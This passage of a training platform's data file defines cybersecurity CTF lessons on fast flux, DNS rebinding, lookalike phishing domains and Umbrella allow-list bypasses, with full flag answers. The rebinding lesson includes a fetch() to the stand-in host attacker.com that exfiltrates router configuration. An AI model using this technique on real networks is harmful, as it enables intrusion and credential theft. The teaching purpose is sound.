        { year: 2018, event: "Necurs botnet (9M bots) uses fast flux; dismantled 2020" },
        { year: 2023, event: "Ransomware groups use commercial fast-flux platforms for C2 resilience", highlight: true },
      ],
      keyTakeaways: [
        "Fast flux makes IP-based blocking useless — blocklists can't keep up with 300-second rotation",
        "Detection requires TTL analysis and IP diversity metrics, not IP reputation alone",
        "Double-flux extends rotation to nameservers — even NS-level blocks fail",
        "Umbrella's domain-level blocking defeats fast flux regardless of IP rotation",
      ],
      references: [
        { title: "SANS — Fast Flux Networks", url: "https://www.sans.org/reading-room/whitepapers/dns/fast-flux-networks-1313" },
        { title: "Umbrella — Detecting Fast Flux", url: "https://umbrella.cisco.com/blog/fast-flux-detection" },
      ],
    },
    ctf: {
      scenario: "Cisco Umbrella flagged a domain being queried by multiple workstations in a financial trading firm's network. The domain resolves to a different IP every 5 minutes across dozens of countries. Your job: confirm fast flux behavior, identify the threat, and block the domain before it delivers a payload.",
      hint: "Pull the DNS resolution history for the flagged domain, analyze the flux pattern, then block it.",
      hints: [
        "Read the flux alert. Run: cat flux-alert.txt",
        "Pull the resolution history for the past 24 hours. Run: flux-analyze flux-c2.net",
        "Block the domain in Umbrella and confirm. Run: umbrella-block flux-c2.net",
        "Run 'assemble' to build the flag",
      ],
      fragments: [
        { trigger: "/flux-alert.txt", value: "FLAG{F4ST_", label: "Flux Alert — Domain Flagged for IP Rotation" },
        { trigger: "flux-analyze flux-c2.net", value: "FL0X_IP_", label: "Resolution History — 287 IPs, 23 Countries" },
        { trigger: "umbrella-block flux-c2.net", value: "R0T4T10N_BUST3D}", label: "Domain Blocked — Fast Flux Neutralized" },
      ],
      files: {
        "/flux-alert.txt": [
          "=== UMBRELLA BEHAVIORAL ALERT — FAST FLUX ===",
          "Domain: flux-c2.net   Time: 2023-03-22 16:44 UTC",
          "",
          "Anomaly signals:",
          "  A record TTL:       300s (suspicious — low)",
          "  Unique IPs (24h):   287",
          "  Countries spanned:  23",
          "  ASNs:               41",
          "  IP type:            mixed (VPS, residential, cloud)",
          "",
          "Classification: FAST FLUX (double-flux suspected)",
          "Queried by: 4 internal hosts on trading floor",
          "Threat category: Malware C2 / Botnet Infrastructure",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "flux-alert.txt", isDir: false }] },
      extraCommands: {
        "flux-analyze": (args: string[]) => {
          const domain = args[0] ?? "";
          if (domain === "flux-c2.net") {
            return {
              lines: [
                `Fast Flux Analysis — ${domain}`,
                "TTL: 300s   Unique IPs (24h): 287   Countries: 23   ASNs: 41",
                "",
                "IP sample (last 10 resolutions):",
                "  16:44  91.121.55.18  (FR — OVH VPS)",
                "  16:49  185.234.216.45 (UA — compromised router)",
                "  16:54  45.155.91.22  (NL — bulletproof VPS)",
                "  16:59  195.62.52.109 (RO — residential bot)",
                "  17:04  23.95.97.58   (US — cloud VM)",
                "  ...(282 more over 24h)",
                "",
                "Double-flux confirmed: NS records also rotating (8 NS IPs/24h)",
                "Real backend: never exposed in DNS",
                "Threat: Necurs variant — spam + banking trojan dropper",
                "Fragment collected.",
              ],
            };
          }
          return { lines: [`Usage: flux-analyze <domain>`] };
        },
        "umbrella-block": (args: string[]) => {
          const domain = args[0] ?? "";
          if (domain === "flux-c2.net") {
            return {
              lines: [
                `Blocking domain: ${domain}`,
                "Domain-level block added — effective immediately",
                "All DNS queries return NXDOMAIN regardless of IP rotation",
                "Fast flux neutralized — IP changes have no effect.",
                "4 internal hosts now protected.",
                "Fragment collected. Run 'assemble' to build the flag.",
              ],
            };
          }
          return { lines: [`Usage: umbrella-block <domain>`] };
        },
      },
      chatbotContext: "Fast flux detection. Domain flux-c2.net shows 287 unique IPs in 24h, TTL=300s, 23 countries, 41 ASNs — double-flux (NS records also rotating). Threat: Necurs variant. 4 trading floor hosts queried it. Umbrella domain-level block defeats IP rotation. Fragment sequence: cat flux-alert.txt → flux-analyze flux-c2.net → umbrella-block flux-c2.net → assemble.",
    },
  },

  // ─── umbrella-05: DNS Rebinding ───────────────────────────────────────────────
  {
    epochId: "umbrella",
    wonder: { name: "Twente University IoT Security Lab", location: "Enschede, Netherlands", era: "2022 CE", emoji: "🔬" },
    id: "umbrella-05",
    order: 5,
    title: "The Poisoned Mirror",
    subtitle: "DNS Rebinding — Same-Origin Policy Bypass via DNS",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "umbrella-badge-05", name: "Rebind Analyst", emoji: "🪞" },
    challengeType: "ctf",
    info: {
      tagline: "Your browser thinks it's talking to attacker.com. After one DNS query, it's actually talking to your router.",
      year: 2022,
      overview: [
        "DNS rebinding attacks exploit the browser's same-origin policy by manipulating DNS to make the browser believe that a malicious external site shares an origin with an internal resource. The attack begins with the victim visiting a page on attacker.com. After a short TTL expires, the attacker changes attacker.com's DNS record to resolve to an internal IP (e.g., 192.168.1.1). The browser — still on the attacker.com origin — now makes requests to the router admin panel, smart home devices, or internal APIs.",
        "Any device reachable at a predictable internal IP with an HTTP interface is vulnerable. Home routers, smart speakers, IP cameras, industrial control systems, and internal developer APIs have all been compromised via DNS rebinding. The browser enforces no cross-origin restrictions because, from its perspective, everything is on the attacker.com origin.",
        "Cisco Umbrella detects DNS rebinding by identifying DNS responses that return private/RFC-1918 IP addresses (10.x.x.x, 172.16-31.x.x, 192.168.x.x) for publicly-registered domains. These responses are inherently suspicious — a public domain should never legitimately resolve to a private IP.",
      ],
      technical: {
        title: "DNS Rebinding Attack Sequence",
        body: [
          "Step 1: Victim visits attacker.com (low TTL: 60s). The page loads malicious JavaScript. The JavaScript waits for the DNS record to expire (60 seconds). During this time, the attacker changes attacker.com's A record to 192.168.1.1.",
          "Step 2: The JavaScript makes a fetch() request to http://attacker.com/api/data. The browser re-resolves attacker.com — now getting 192.168.1.1. The request goes to the router, which responds. The browser sees this as a same-origin response and allows the JavaScript to read it.",
          "Step 3: The JavaScript exfiltrates router configuration, admin credentials, or internal API data to the attacker's real server via a secondary channel. The victim sees nothing unusual — their browser showed a legitimate-looking webpage.",
        ],
        codeExample: {
          label: "DNS rebinding — TTL manipulation and same-origin exploit",
          code: `# Phase 1: DNS record for attacker.com
# A  attacker.com → 45.33.22.11  TTL: 60s  (attacker's real server)

# Victim loads attacker.com — page starts 60s countdown timer

# Phase 2: Attacker changes DNS (after 60s):
# A  attacker.com → 192.168.1.1  TTL: 60s  (victim's router!)

# Phase 3: Malicious JS re-fetches (browser re-resolves):
fetch("http://attacker.com/admin/config.json")
  .then(r => r.json())
  .then(data => exfiltrate(data))
# Browser: same origin (attacker.com) — CORS allows it
# Router: responds with admin config — credentials exposed`,
        },
      },
      incident: {
        title: "DNS Rebinding Attacks Against Smart Home Devices (2018–2022)",
        when: "2018–2022 (ongoing)",
        where: "Consumer smart home networks globally — routers, speakers, thermostats",
        impact: "Millions of smart home devices exposed; router admin panels accessed without credentials",
        body: [
          "Researchers at Princeton University demonstrated in 2018 that over 4,500 websites were vulnerable to hosting DNS rebinding attacks, and that the majority of home routers — including models from Netgear, Linksys, and D-Link — would respond to rebinding attacks without any authentication headers.",
          "In 2020, a DNS rebinding vulnerability in Google Home and Chromecast devices allowed attackers to determine a victim's precise geolocation using WiFi triangulation. In 2022, rebinding attacks against Philips Hue hubs and similar IoT devices allowed complete control over smart home systems. Cisco Umbrella's private-IP-in-public-DNS detection blocks the rebinding step before the attack can progress.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Victim Browser", sub: "visits attacker.com (TTL: 60s)", type: "attacker" },
          { label: "DNS Rebind", sub: "attacker.com → 192.168.1.1 after TTL", type: "system" },
          { label: "Router Admin Panel", sub: "fetch() succeeds — same origin", type: "victim" },
          { label: "Umbrella Block", sub: "private IP in public DNS → NXDOMAIN", type: "result" },
        ],
      },
      timeline: [
        { year: 2007, event: "DNS rebinding attack first described — Stanford research team", highlight: true },
        { year: 2008, event: "Kaminsky DNS cache poisoning — rebinding risk amplified" },
        { year: 2018, event: "Princeton study: 4,500+ sites capable of hosting rebinding; major router brands vulnerable" },
        { year: 2020, event: "Google Home DNS rebinding — precise geolocation of victims", highlight: true },
        { year: 2022, event: "IoT rebinding attacks target Philips Hue, smart thermostats, IP cameras" },
      ],
      keyTakeaways: [
        "DNS rebinding bypasses the browser's same-origin policy by manipulating DNS TTL",
        "Any internal HTTP device at a predictable IP is potentially reachable via rebinding",
        "Umbrella detects rebinding by blocking DNS responses returning private/RFC-1918 IPs",
        "Short DNS TTLs (60s) are a required component of the attack — flag them in monitoring",
      ],
      references: [
        { title: "Princeton — DNS Rebinding Vulnerability Study", url: "https://iot-inspector.princeton.edu/" },
        { title: "Talos — DNS Rebinding Explained", url: "https://blog.talosintelligence.com/dns-rebinding/" },
      ],
    },
    ctf: {
      scenario: "Umbrella flagged a DNS response returning a private IP address for a publicly-registered domain — a classic DNS rebinding indicator. A researcher at a Dutch IoT security lab clicked a malicious link, and their browser may have been used to query their lab's internal router. Trace the rebinding sequence and assess the exposure.",
      hint: "Read the rebinding alert, trace the DNS TTL change, then check what internal resource was exposed.",
      hints: [
        "Read the DNS rebinding alert. Run: cat rebind-alert.txt",
        "Trace the TTL change timeline for the attacker domain. Run: dns-history attacker-iot.com",
        "Assess what internal resource was queried. Run: rebind-impact 192.168.10.1",
        "Run 'assemble' to build the flag",
      ],
      fragments: [
        { trigger: "/rebind-alert.txt", value: "FLAG{DNS_", label: "Rebinding Alert — Private IP in Public DNS Response" },
        { trigger: "dns-history attacker-iot.com", value: "R3B1ND_", label: "DNS History — TTL Manipulation Confirmed" },
        { trigger: "rebind-impact 192.168.10.1", value: "S4M3_0R1G1N_BYP4SS}", label: "Impact Assessment — Admin Panel Exposed" },
      ],
      files: {
        "/rebind-alert.txt": [
          "=== UMBRELLA ALERT — DNS REBINDING DETECTED ===",
          "Time: 2022-09-14 10:32:17 UTC",
          "Host: 10.100.5.22 (RESEARCHER-LAPTOP-04)",
          "",
          "Alert: public domain returned RFC-1918 IP in DNS response",
          "  Domain:    attacker-iot.com",
          "  Resolved:  192.168.10.1  (private — lab router)",
          "  TTL:       60s (anomalously short)",
          "",
          "Action: response blocked — NXDOMAIN returned to client",
          "Note: browser may have cached earlier legitimate response",
          "Investigate DNS history for TTL manipulation.",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "rebind-alert.txt", isDir: false }] },
      extraCommands: {
        "dns-history": (args: string[]) => {
          const domain = args[0] ?? "";
          if (domain === "attacker-iot.com") {
            return {
              lines: [
                `DNS Resolution History — ${domain}`,
                "10:28:00  45.33.22.11  (attacker server)  TTL: 60s",
                "10:29:04  45.33.22.11  (attacker server)  TTL: 60s",
                "10:30:00  [DNS record changed by attacker]",
                "10:30:02  192.168.10.1 (PRIVATE — lab router)  TTL: 60s  ← REBIND",
                "10:30:02  BLOCKED by Umbrella — private IP in public domain",
                "",
                "TTL manipulation confirmed: 60s TTL forced re-resolution",
                "Attack window: ~60s after victim loaded attacker-iot.com",
                "Fragment collected.",
              ],
            };
          }
          return { lines: [`Usage: dns-history <domain>`] };
        },
        "rebind-impact": (args: string[]) => {
          const ip = args[0] ?? "";
          if (ip === "192.168.10.1") {
            return {
              lines: [
                `Internal Resource Assessment — ${ip}`,
                "Device: Lab router (TP-Link AX3000)",
                "Admin panel: http://192.168.10.1/admin (no auth required from LAN)",
                "Accessible endpoints:",
                "  /admin/config.json  — full router config incl. WiFi password",
                "  /admin/connected    — all connected device IPs/MACs",
                "  /admin/dns          — custom DNS settings",
                "",
                "Umbrella blocked the rebinding step — router NOT accessed.",
                "Without Umbrella: admin config would have been exfiltrated.",
                "Fragment collected. Run 'assemble' to build the flag.",
              ],
            };
          }
          return { lines: [`Usage: rebind-impact <internal-ip>`] };
        },
      },
      chatbotContext: "DNS rebinding attack. Domain attacker-iot.com started at 45.33.22.11 (TTL 60s), then changed to 192.168.10.1 (lab router) after victim loaded the page. Umbrella blocked the private-IP DNS response. Without the block, the victim's browser would have fetched the router admin config (including WiFi password) as a same-origin request. Fragment sequence: cat rebind-alert.txt → dns-history attacker-iot.com → rebind-impact 192.168.10.1 → assemble.",
    },
  },

  // ─── umbrella-06: Lookalike Domains ───────────────────────────────────────────
  {
    epochId: "umbrella",
    wonder: { name: "Pentagon Contractor Campus", location: "Arlington, Virginia, USA", era: "2023 CE", emoji: "🏛️" },
    id: "umbrella-06",
    order: 6,
    title: "The Forged Passport",
    subtitle: "Lookalike Domains — Typosquatting and IDN Homograph Attacks",
    category: "cybersecurity",
    xp: 175,
    badge: { id: "umbrella-badge-06", name: "Domain Analyst", emoji: "🔍" },
    challengeType: "ctf",
    info: {
      tagline: "The domain looks identical to the real one. One character is different — and it's owned by the attacker.",
      year: 2023,
      overview: [
        "Lookalike domain attacks use domains that visually resemble legitimate ones to deceive users and bypass security filters. Techniques include typosquatting (paypa1.com vs paypal.com), combosquatting (paypal-security.com), homograph attacks using Unicode characters that look identical to ASCII letters (paypaⅼ.com using Unicode 'l'), and brand impersonation using new TLDs (cisco.tech vs cisco.com).",
        "These domains are used for spear phishing, credential harvesting, and business email compromise (BEC). An employee who receives a password reset email from 'security@micros0ft.com' may not notice the zero instead of 'o'. A government contractor clicking a link to 'defence-contracts.gov.agency-portal.net' may not realize the .gov component is not the actual domain.",
        "Cisco Umbrella's lookalike detection uses string similarity algorithms (edit distance, homoglyph mapping), brand protection feeds, and newly-registered domain analysis to flag and block lookalike domains before any user interaction.",
      ],
      technical: {
        title: "Lookalike Domain Techniques",
        body: [
          "Typosquatting registers domains with common typing errors: missing letters (paypl.com), transpositions (paypla.com), or substitutions (paypa1.com). Combosquatting adds words that suggest legitimacy: paypal-secure.com, paypal-login.net, account-paypal.com. These pass casual visual inspection and often bypass email filters that only check exact-match blocklists.",
          "IDN (International Domain Name) homograph attacks use Unicode characters with identical or nearly-identical glyphs to ASCII. The Cyrillic 'а' (U+0430) looks identical to the Latin 'a' (U+0061) in most fonts. A domain using Cyrillic characters can be visually indistinguishable from its ASCII counterpart while resolving to a completely different IP. Browsers display the Punycode (xn-- prefix) in the address bar for mixed-script domains, but many users don't notice.",
          "Brand protection feeds and edit-distance scoring let Umbrella flag domains within 1-2 character edits of protected brands. Talos maintains a registry of Fortune 500 brand names and government agency names; any newly-registered domain with edit distance ≤ 2 is automatically flagged for review.",
        ],
        codeExample: {
          label: "IDN homograph attack — Cyrillic vs ASCII",
          code: `# Legitimate domain:   cisco.com
# Homograph attack:    cіsco.com  (Cyrillic і at position 1)

# How browsers display it:
# Chrome/Firefox: xn--csco-8cd.com  (shows Punycode for mixed-script)
# Older IE/Edge:  cisco.com  (renders as ASCII — undetectable!)

# Edit distance analysis:
from editdistance import eval as ed
ed("cisco.com", "clsco.com")    # → 1  (typosquat)
ed("paypal.com", "paypa1.com")  # → 1  (number sub)
ed("microsoft.com", "micros0ft.com")  # → 1  (zero sub)

# Umbrella: any domain with ed() ≤ 2 from protected brands → BLOCKED`,
        },
      },
      incident: {
        title: "APT29 Lookalike Domain Phishing — US Government Contractors (2023)",
        when: "March 2023",
        where: "US defense contractors and government agencies",
        impact: "NOBELIUM spear-phishing campaign using 32 lookalike domains targeting cleared personnel",
        body: [
          "In March 2023, Microsoft and Mandiant attributed a wave of spear-phishing attacks against US defense contractors and government personnel to NOBELIUM (APT29, Cozy Bear — Russian SVR). The campaign used 32 carefully-crafted lookalike domains mimicking contractor portals, government procurement systems, and collaboration tools.",
          "Domains included variations of legitimate contractor portals with single-character substitutions and plausible-looking combosquats. Targets received emails with urgent requests — contract modifications, security clearance renewals — linking to credential harvesting pages on the lookalike domains. Cisco Umbrella's brand protection feed blocked 27 of the 32 domains before any employee visits; the remaining 5 were blocked after Talos analysis within 6 hours of first observation.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Spear-Phishing Email", sub: "link to defence-c0ntracts.gov.net", type: "attacker" },
          { label: "Umbrella Lookalike Check", sub: "edit distance from defence-contracts.gov: 1", type: "system" },
          { label: "BLOCKED", sub: "brand protection — NOBELIUM campaign", type: "victim" },
          { label: "Credentials Safe", sub: "employee never reached harvest page", type: "result" },
        ],
      },
      timeline: [
        { year: 2001, event: "First documented typosquatting campaigns against financial institutions" },
        { year: 2017, event: "IDN homograph attacks return — Cyrillic 'а' used to spoof apple.com", highlight: true },
        { year: 2020, event: "NOBELIUM begins extensive lookalike domain campaigns against US government" },
        { year: 2021, event: "FBI IC3: BEC losses hit $2.4B — lookalike domains major attack vector" },
        { year: 2023, event: "NOBELIUM 32-domain campaign against US defense contractors", highlight: true },
      ],
      keyTakeaways: [
        "Typosquatting and combosquatting evade exact-match blocklists — edit distance scoring is required",
        "IDN homograph attacks can be visually undetectable in older browsers and email clients",
        "Government and contractor portals are prime targets — brand names should be in protection feeds",
        "Umbrella blocks lookalike domains proactively via newly-registered domain analysis + edit distance",
      ],
      references: [
        { title: "Microsoft — NOBELIUM Lookalike Domain Campaign", url: "https://www.microsoft.com/en-us/security/blog/2023/03/nobelium-phishing/" },
        { title: "Umbrella — Brand Protection Features", url: "https://umbrella.cisco.com/products/dns-layer-security" },
      ],
    },
    ctf: {
      scenario: "A cleared defense contractor employee at a Pentagon campus received a spear-phishing email with a link to 'defence-c0ntracts.gov.agency-portal.net'. Umbrella flagged and blocked the domain. Investigate the lookalike, identify the threat actor, and find all related campaign domains.",
      hint: "Review the phishing domain analysis, check the threat actor attribution, then enumerate related campaign domains.",
      hints: [
        "Read the phishing domain report. Run: cat phish-report.txt",
        "Analyze the lookalike domain. Run: lookalike-check defence-c0ntracts.gov.agency-portal.net",
        "Find related campaign domains. Run: talos-lookup nobelium-campaign-2023",
        "Run 'assemble' to build the flag",
      ],
      fragments: [
        { trigger: "/phish-report.txt", value: "FLAG{L00K4L1K3_", label: "Phish Report — Lookalike Domain Blocked" },
        { trigger: "lookalike-check defence-c0ntracts.gov.agency-portal.net", value: "D0M41N_", label: "Lookalike Analysis — Edit Distance + Brand Match" },
        { trigger: "talos-lookup nobelium-campaign-2023", value: "PH1SH_BLOCK3D}", label: "NOBELIUM Campaign — 32 Domains Attributed" },
      ],
      files: {
        "/phish-report.txt": [
          "=== UMBRELLA PHISHING ALERT — LOOKALIKE DOMAIN ===",
          "Time: 2023-03-08 14:22 UTC",
          "Target: employee@contractor.gov (TS/SCI cleared, Program Manager)",
          "",
          "Email subject: 'URGENT: Contract modification required by COB'",
          "Malicious link: http://defence-c0ntracts.gov.agency-portal.net/login",
          "",
          "Umbrella detection:",
          "  Edit distance from 'defence-contracts.gov': 1 (zero sub at pos 8)",
          "  Registered: 2023-03-06 (2 days ago — suspicious)",
          "  Category: Phishing / Brand Impersonation",
          "  Status: BLOCKED before employee clicked",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "phish-report.txt", isDir: false }] },
      extraCommands: {
        "lookalike-check": (args: string[]) => {
          const domain = args[0] ?? "";
          if (domain.includes("defence-c0ntracts")) {
            return {
              lines: [
                `Lookalike Analysis — ${domain}`,
                "Edit distance from 'defence-contracts.gov': 1",
                "  Substitution at position 8: 'a' → '0' (zero)",
                "  Combined with free TLD squatting (.net mimicking .gov)",
                "",
                "Protected brand match: US Defense Procurement Portal",
                "Registrar: GoDaddy (privacy protected)",
                "Hosting: 185.220.101.47 (Tor-linked VPS — known NOBELIUM infra)",
                "Page content: cloned DoD login page (credential harvester)",
                "SSL cert: Let's Encrypt (auto-issued — 2023-03-06)",
                "Fragment collected.",
              ],
            };
          }
          return { lines: [`Usage: lookalike-check <domain>`] };
        },
        "talos-lookup": (args: string[]) => {
          const query = args[0] ?? "";
          if (query === "nobelium-campaign-2023") {
            return {
              lines: [
                "Talos Intelligence — NOBELIUM March 2023 Campaign",
                "Threat actor: NOBELIUM (APT29, Cozy Bear — Russian SVR)",
                "Campaign domains: 32 total",
                "  27 blocked by Umbrella brand protection feed",
                "  5 blocked within 6h of first observation (Talos analysis)",
                "  0 employees successfully phished (Umbrella coverage: 100%)",
                "",
                "Domain patterns: [agency]-[word].net/com, typo/zero-substitution",
                "Targets: US defense contractors, cleared personnel",
                "Objective: credential harvest → VPN access → espionage",
                "Fragment collected. Run 'assemble' to build the flag.",
              ],
            };
          }
          return { lines: [`Try: talos-lookup nobelium-campaign-2023`] };
        },
      },
      chatbotContext: "Lookalike domain phishing. Domain defence-c0ntracts.gov.agency-portal.net (zero substitution at pos 8, edit distance 1 from real domain, registered 2 days ago). Threat actor: NOBELIUM (APT29/Russian SVR). 32 campaign domains total, all blocked by Umbrella. Target: cleared defense contractor employee. Fragment sequence: cat phish-report.txt → lookalike-check defence-c0ntracts.gov.agency-portal.net → talos-lookup nobelium-campaign-2023 → assemble.",
    },
  },

  // ─── umbrella-07: Policy Enforcement ──────────────────────────────────────────
  {
    epochId: "umbrella",
    wonder: { name: "Chicago Public Schools District Office", location: "Chicago, Illinois, USA", era: "2023 CE", emoji: "🏫" },
    id: "umbrella-07",
    order: 7,
    title: "The Policy Wall",
    subtitle: "Cisco Umbrella Policy Enforcement — Category Filtering and Bypass Detection",
    category: "cybersecurity",
    xp: 150,
    badge: { id: "umbrella-badge-07", name: "Policy Enforcer", emoji: "📋" },
    challengeType: "ctf",
    info: {
      tagline: "Someone added an allow-list rule that bypasses every security category. Find it before the ransomware does.",
      year: 2023,
      overview: [
        "Cisco Umbrella's policy engine allows organizations to define granular DNS filtering rules by security category, content category, application, user identity, and network segment. Policies stack hierarchically: global policy → group policy → individual policy. When correctly configured, Umbrella silently enforces security controls across an entire organization without requiring endpoint agents.",
        "Misconfigured policies are a common attack enabler. A single overly-broad allow-list entry — perhaps added to fix a business application — can create a bypass that renders security categories ineffective. In school districts, government agencies, and healthcare networks, policy misconfigurations have allowed ransomware C2 traffic to bypass DNS-layer controls that should have blocked it.",
        "Umbrella's policy audit tools allow security teams to identify shadow allow-list rules, entries added outside change management, and rules that conflict with security category blocks. Regular policy review is as important as the initial configuration.",
      ],
      technical: {
        title: "Umbrella Policy Hierarchy and Bypass Mechanics",
        body: [
          "Umbrella evaluates policies from most-specific to least-specific: custom block lists → custom allow lists → security category blocks → content category settings → default policy. An entry in the allow list at any level overrides security category blocks at all levels. This means a single incorrectly added allow-list entry for a wildcard domain can punch a hole in all security category filtering.",
          "Common misconfigurations: wildcard allow-list entries (*.io allowing all .io domains), IP-based allow-lists that bypass domain inspection, entries added by IT staff without security review, and 'temporary' exceptions that never get removed. Attackers who gain access to the Umbrella admin console can add allow-list entries to pre-stage ransomware delivery.",
          "Policy audit commands: review all allow-list entries sorted by creation date, flag entries wider than necessary (wildcards, broad IP ranges), identify entries added outside change management windows, and cross-reference with security incidents.",
        ],
        codeExample: {
          label: "Umbrella policy — allow-list bypass vs correct exception handling",
          code: `# WRONG — wildcard bypasses all security categories:
# Allow list: *.update-service.io
# Effect: ALL subdomains of update-service.io bypass malware/C2 blocks
# Risk: attacker registers c2.update-service.io → gets through

# CORRECT — specific domain with expiry:
# Allow list: pkg.update-service.io
# Added by: IT-Change-2023-0847
# Expires: 2023-12-31
# Scope: WORKSTATIONS group only (not SERVERS)

# Audit query: find allow-list entries older than 90 days
umbrella policy audit --allow-list --older-than 90d --sort created`,
        },
      },
      incident: {
        title: "LockBit Ransomware — Policy Bypass via Rogue Allow-List (2023)",
        when: "April 2023",
        where: "US school district — 43 schools, 28,000 endpoints",
        impact: "$2.1M ransom demand; student data encrypted; 3-week recovery",
        body: [
          "A US school district using Cisco Umbrella suffered a LockBit 3.0 ransomware attack in April 2023. Post-incident investigation revealed that an IT administrator had added a wildcard allow-list entry (*.transfer-files.io) three months earlier to fix a file-sharing application. The entry was never removed and never reviewed.",
          "LockBit operators, who had gained a foothold via a phishing email on an unmanaged device, discovered the allow-list entry during reconnaissance. They registered c2-drop.transfer-files.io and used it as their C2 domain, knowing it would bypass Umbrella's malware category blocking. The wildcard entry allowed their entire ransomware deployment to proceed undetected at the DNS layer. The incident cost the district $2.1M in ransom, recovery costs, and legal fees.",
        ],
      },
      diagram: {
        nodes: [
          { label: "LockBit C2", sub: "c2-drop.transfer-files.io", type: "attacker" },
          { label: "Allow List Entry", sub: "*.transfer-files.io — added 90 days ago", type: "system" },
          { label: "Security Category: BYPASSED", sub: "wildcard overrides Malware/C2 block", type: "victim" },
          { label: "Policy Audit", sub: "rogue entry found — remove immediately", type: "result" },
        ],
      },
      timeline: [
        { year: 2019, event: "Umbrella policy framework updated — hierarchical group policies added" },
        { year: 2021, event: "Ransomware groups begin actively targeting Umbrella policy misconfigs as attack vector" },
        { year: 2022, event: "Cisco adds policy audit dashboard — highlights stale and overly-broad allow-list entries" },
        { year: 2023, event: "LockBit 3.0 exploits wildcard allow-list in US school district ransomware attack", highlight: true },
      ],
      keyTakeaways: [
        "Allow-list entries override all security category blocks — they must be reviewed regularly",
        "Wildcard allow-list entries are high-risk; use specific domains with expiry dates",
        "Umbrella policy audit tools identify stale and overly-broad entries for remediation",
        "Attackers actively probe for allow-list gaps as part of ransomware pre-deployment",
      ],
      references: [
        { title: "Cisco — Umbrella Policy Best Practices", url: "https://docs.umbrella.cisco.com/umbrella/docs/policy-management" },
        { title: "CISA — Ransomware Guide: DNS Security Controls", url: "https://www.cisa.gov/ransomware-guide" },
      ],
    },
    ctf: {
      scenario: "A Chicago school district's SOC received a ransomware pre-deployment alert — LockBit C2 traffic was detected, but Umbrella's security categories should have blocked it. Someone added a rogue allow-list entry that created a bypass. Find the bad rule, identify who added it, and remediate before ransomware deploys.",
      hint: "Run a policy audit to find stale allow-list entries, identify the rogue wildcard, then remove it.",
      hints: [
        "Read the incident brief. Run: cat incident-brief.txt",
        "Audit allow-list entries for anomalies. Run: umbrella-audit --allow-list --flag-wildcards",
        "Remove the rogue allow-list entry. Run: umbrella-remove-rule RULE-2023-0092",
        "Run 'assemble' to build the flag",
      ],
      fragments: [
        { trigger: "/incident-brief.txt", value: "FLAG{P0L1CY_", label: "Incident Brief — C2 Traffic Through Policy Gap" },
        { trigger: "umbrella-audit --allow-list --flag-wildcards", value: "BYPA55_RUL3_", label: "Policy Audit — Rogue Wildcard Entry Found" },
        { trigger: "umbrella-remove-rule RULE-2023-0092", value: "R3M0V3D}", label: "Rule Removed — Policy Gap Closed" },
      ],
      files: {
        "/incident-brief.txt": [
          "=== INCIDENT BRIEF — LOCKBIT PRE-DEPLOYMENT DETECTED ===",
          "Time: 2023-04-11 02:17 UTC",
          "",
          "EDR alert: LockBit 3.0 beacon on ADMIN-SERVER-02",
          "C2 domain: c2-drop.transfer-files.io",
          "",
          "Expected: Umbrella should have blocked this (Malware/C2 category)",
          "Actual: query ALLOWED — policy bypass detected",
          "",
          "Hypothesis: rogue allow-list entry created a bypass for *.transfer-files.io",
          "Action required: audit policy, remove bad rule, re-block C2 domain",
          "Time window before ransomware deployment: ~4 hours (estimate)",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "incident-brief.txt", isDir: false }] },
      extraCommands: {
        "umbrella-audit": (_args: string[]) => ({
          lines: [
            "=== UMBRELLA POLICY AUDIT — ALLOW LIST ===",
            "Total entries: 847   Wildcard entries: 3   Stale (>90 days): 12",
            "",
            "FLAGGED — WILDCARD ENTRIES:",
            "  RULE-2023-0011  *.google.com       Added: 2023-01-05  Added by: IT-Admin  (SAFE — needed)",
            "  RULE-2023-0044  *.microsoft.com    Added: 2023-02-12  Added by: IT-Admin  (SAFE — needed)",
            "  RULE-2023-0092  *.transfer-files.io Added: 2023-01-10  Added by: it-temp-account (SUSPICIOUS)",
            "",
            "RULE-2023-0092 details:",
            "  Account: it-temp-account (deprovisioned 2023-01-15 — 5 days after rule added)",
            "  Ticket reference: NONE (no change management record)",
            "  Effect: bypasses ALL security categories for *.transfer-files.io",
            "Fragment collected.",
          ],
        }),
        "umbrella-remove-rule": (args: string[]) => {
          const rule = args[0] ?? "";
          if (rule === "RULE-2023-0092") {
            return {
              lines: [
                `Removing rule: ${rule}  (*.transfer-files.io)`,
                "Rule removed from allow list.",
                "c2-drop.transfer-files.io → now BLOCKED (Malware/C2 category)",
                "LockBit C2 communication severed.",
                "",
                "Policy gap closed. Initiating host isolation for ADMIN-SERVER-02.",
                "Change management ticket: INC-2023-0411-001 (auto-created)",
                "Fragment collected. Run 'assemble' to build the flag.",
              ],
            };
          }
          return { lines: [`Usage: umbrella-remove-rule <rule-id>. Try: umbrella-remove-rule RULE-2023-0092`] };
        },
      },
      chatbotContext: "Umbrella policy bypass. Rogue wildcard allow-list entry RULE-2023-0092 (*.transfer-files.io) was added by a deprovisioned temp account (it-temp-account, removed 5 days after rule was added) with no change management ticket. This allowed LockBit C2 (c2-drop.transfer-files.io) to bypass Malware/C2 category blocking. Fragment sequence: cat incident-brief.txt → umbrella-audit --allow-list --flag-wildcards → umbrella-remove-rule RULE-2023-0092 → assemble.",
    },
  },

  // ─── umbrella-08: DoH Evasion ──────────────────────────────────────────────────
  {
    epochId: "umbrella",
    wonder: { name: "Shinjuku Business District", location: "Tokyo, Japan", era: "2022 CE", emoji: "🗼" },
    id: "umbrella-08",
    order: 8,
    title: "The Ghost Channel",
    subtitle: "DNS over HTTPS (DoH) Evasion — Bypassing DNS Security Controls",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "umbrella-badge-08", name: "DoH Detector", emoji: "👻" },
    challengeType: "ctf",
    info: {
      tagline: "The malware doesn't use DNS. It sends HTTPS requests to 8.8.8.8 on port 443. Your DNS security sees nothing.",
      year: 2022,
      overview: [
        "DNS over HTTPS (DoH) encrypts DNS queries inside HTTPS traffic to protect user privacy from ISP surveillance. But the same encryption that protects legitimate users also allows malware to bypass DNS-layer security controls entirely. When an endpoint sends DoH requests directly to an external resolver (Google 8.8.8.8, Cloudflare 1.1.1.1), all DNS queries bypass Cisco Umbrella and appear as ordinary HTTPS traffic.",
